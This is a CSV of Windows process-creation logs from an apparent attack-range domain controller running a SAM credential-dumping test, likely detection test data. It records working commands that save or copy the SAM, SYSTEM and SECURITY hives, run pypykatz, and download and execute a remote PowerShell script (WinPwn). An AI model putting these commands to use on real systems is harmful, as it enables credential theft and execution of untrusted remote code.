dest,user,"parent_process","process_name",process,"process_id","parent_process_id",count,firstTime,lastTime
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAaQBmACAAKAAkAFAAUwBWAGUAcgBzAGkAbwBuAFQAYQBiAGwAZQAuAFAAUwBWAGUAcgBzAGkAbwBuACAALQBsAHQAIABbAFYAZQByAHMAaQBvAG4AXQAiADMALgAwACIAKQAgAHsACgAnAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnAAoAZQB4AGkAdAAgADEACgB9AAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQAgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIAB7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQAKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA==","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\ansible-moduletmp-133400253353655315-676500118\ka2teyfw.cmdline""",6128,5540,1,"2023-09-24T10:35:35","2023-09-24T10:35:35"
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAaQBmACAAKAAkAFAAUwBWAGUAcgBzAGkAbwBuAFQAYQBiAGwAZQAuAFAAUwBWAGUAcgBzAGkAbwBuACAALQBsAHQAIABbAFYAZQByAHMAaQBvAG4AXQAiADMALgAwACIAKQAgAHsACgAnAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnAAoAZQB4AGkAdAAgADEACgB9AAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQAgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIAB7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQAKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA==","powershell.exe","""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEMAbABlAGEAbgB1AHAA",5148,600,1,"2023-09-24T10:36:26","2023-09-24T10:36:26"
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAaQBmACAAKAAkAFAAUwBWAGUAcgBzAGkAbwBuAFQAYQBiAGwAZQAuAFAAUwBWAGUAcgBzAGkAbwBuACAALQBsAHQAIABbAFYAZQByAHMAaQBvAG4AXQAiADMALgAwACIAKQAgAHsACgAnAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnAAoAZQB4AGkAdAAgADEACgB9AAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQAgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIAB7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQAKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA==","powershell.exe","""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAMwAwADAAIAAtAEUAeABlAGMAdQB0AGkAbwBuAEwAbwBnAFAAYQB0AGgAIABDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAYQB0AGMAXwBlAHgAZQBjAHUAdABpAG8AbgAuAGMAcwB2AA==",5480,2840,1,"2023-09-24T10:36:08","2023-09-24T10:36:08"
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAaQBmACAAKAAkAFAAUwBWAGUAcgBzAGkAbwBuAFQAYQBiAGwAZQAuAFAAUwBWAGUAcgBzAGkAbwBuACAALQBsAHQAIABbAFYAZQByAHMAaQBvAG4AXQAiADMALgAwACIAKQAgAHsACgAnAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnAAoAZQB4AGkAdAAgADEACgB9AAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQAgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIAB7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQAKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA==","powershell.exe","""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA",4432,1648,1,"2023-09-24T10:35:41","2023-09-24T10:35:41"
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\System32\ie4uinit.exe"" -UserConfig","ie4uinit.exe","C:\Windows\System32\ie4uinit.exe -ClearIconCache",4412,4372,1,"2023-09-24T10:08:11","2023-09-24T10:08:11"
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:","DismHost.exe","C:\Users\ADMINI~1\AppData\Local\Temp\3D79FB47-7885-4B9A-A626-621BB6FE8E65\dismhost.exe {EFE0109C-F9DA-4882-B98E-FD9B49C66F9F}",4976,612,1,"2023-09-24T10:10:31","2023-09-24T10:10:31"
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\system32\cmd.exe"" /c ""py -3 --version &gt;nul 2&gt;&amp;1 &amp;&amp; exit /b %errorlevel%""","py.exe","py  -3 --version",5380,3388,1,"2023-09-24T10:35:43","2023-09-24T10:35:43"
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\system32\cmd.exe"" /c ""py -3 -m pip --version &gt;nul 2&gt;&amp;1 &amp;&amp; exit /b %errorlevel%""","py.exe","py  -3 -m pip --version",5412,3704,1,"2023-09-24T10:35:43","2023-09-24T10:35:43"
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\system32\cmd.exe"" /c ""pypykatz -h &gt;nul 2&gt;&amp;1 &amp;&amp; exit /b %errorlevel%""","pypykatz.exe","pypykatz  -h",4356,4676,1,"2023-09-24T10:36:01","2023-09-24T10:36:01"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM""","esentutl.exe","esentutl.exe  /y /vss C:\Windows/system32/config/SAM /d C:\Users\ADMINI~1\AppData\Local\Temp/SAM",5640,3448,1,"2023-09-24T10:36:13","2023-09-24T10:36:13"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp;&amp; dir /B %temp%\SAMvss%a""","certutil.exe","certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\Windows\System32\config\SAM"" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss10 2",5540,6092,1,"2023-09-24T10:36:19","2023-09-24T10:36:19"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp;&amp; dir /B %temp%\SAMvss%a""","certutil.exe","certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss1 2",552,6092,1,"2023-09-24T10:36:18","2023-09-24T10:36:18"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp;&amp; dir /B %temp%\SAMvss%a""","certutil.exe","certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM"" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss2 2",3396,6092,1,"2023-09-24T10:36:18","2023-09-24T10:36:18"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp;&amp; dir /B %temp%\SAMvss%a""","certutil.exe","certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM"" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss3 2",5788,6092,1,"2023-09-24T10:36:18","2023-09-24T10:36:18"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp;&amp; dir /B %temp%\SAMvss%a""","certutil.exe","certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\Windows\System32\config\SAM"" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss4 2",4252,6092,1,"2023-09-24T10:36:18","2023-09-24T10:36:18"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp;&amp; dir /B %temp%\SAMvss%a""","certutil.exe","certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\System32\config\SAM"" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss5 2",5416,6092,1,"2023-09-24T10:36:19","2023-09-24T10:36:19"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp;&amp; dir /B %temp%\SAMvss%a""","certutil.exe","certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy6\Windows\System32\config\SAM"" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss6 2",1648,6092,1,"2023-09-24T10:36:19","2023-09-24T10:36:19"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp;&amp; dir /B %temp%\SAMvss%a""","certutil.exe","certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\Windows\System32\config\SAM"" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss7 2",660,6092,1,"2023-09-24T10:36:19","2023-09-24T10:36:19"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp;&amp; dir /B %temp%\SAMvss%a""","certutil.exe","certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\Windows\System32\config\SAM"" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss8 2",4420,6092,1,"2023-09-24T10:36:19","2023-09-24T10:36:19"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp;&amp; dir /B %temp%\SAMvss%a""","certutil.exe","certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy9\Windows\System32\config\SAM"" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss9 2",6080,6092,1,"2023-09-24T10:36:19","2023-09-24T10:36:19"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""pip install pypykatz""","pip.exe","pip  install pypykatz",5204,5268,1,"2023-09-24T10:35:45","2023-09-24T10:35:45"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""pypykatz live registry""","pypykatz.exe","pypykatz  live registry",4636,5544,1,"2023-09-24T10:36:11","2023-09-24T10:36:11"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""reg save HKLM\sam %temp%\sam &amp; reg save HKLM\system %temp%\system &amp; reg save HKLM\security %temp%\security""","reg.exe","reg  save HKLM\sam C:\Users\ADMINI~1\AppData\Local\Temp\sam",3916,4504,1,"2023-09-24T10:36:10","2023-09-24T10:36:10"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""reg save HKLM\sam %temp%\sam &amp; reg save HKLM\system %temp%\system &amp; reg save HKLM\security %temp%\security""","reg.exe","reg  save HKLM\security C:\Users\ADMINI~1\AppData\Local\Temp\security",3972,4504,1,"2023-09-24T10:36:10","2023-09-24T10:36:10"
"ar-win-dc.attackrange.local",Administrator,"""cmd.exe"" /c ""reg save HKLM\sam %temp%\sam &amp; reg save HKLM\system %temp%\system &amp; reg save HKLM\security %temp%\security""","reg.exe","reg  save HKLM\system C:\Users\ADMINI~1\AppData\Local\Temp\system",4136,4504,1,"2023-09-24T10:36:10","2023-09-24T10:36:10"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive}","HOSTNAME.EXE","""C:\Windows\system32\HOSTNAME.EXE""",3648,5272,1,"2023-09-24T10:36:21","2023-09-24T10:36:21"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive}","HOSTNAME.EXE","""C:\Windows\system32\HOSTNAME.EXE""",4936,5272,1,"2023-09-24T10:36:21","2023-09-24T10:36:21"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive}","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\cfvay5mu\cfvay5mu.cmdline""",3928,5272,1,"2023-09-24T10:36:22","2023-09-24T10:36:22"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive}","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\eguc310o\eguc310o.cmdline""",5204,5272,1,"2023-09-24T10:36:23","2023-09-24T10:36:23"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive}","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\jvcunnyt\jvcunnyt.cmdline""",4212,5272,1,"2023-09-24T10:36:21","2023-09-24T10:36:21"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive}","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\lxtxytis\lxtxytis.cmdline""",5024,5272,1,"2023-09-24T10:36:22","2023-09-24T10:36:22"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {1..10 | % {
  rm \""""$env:TEMP\SAMvss$_\"""" -ErrorAction Ignore
}}","HOSTNAME.EXE","""C:\Windows\system32\HOSTNAME.EXE""",4488,4520,1,"2023-09-24T10:36:30","2023-09-24T10:36:30"
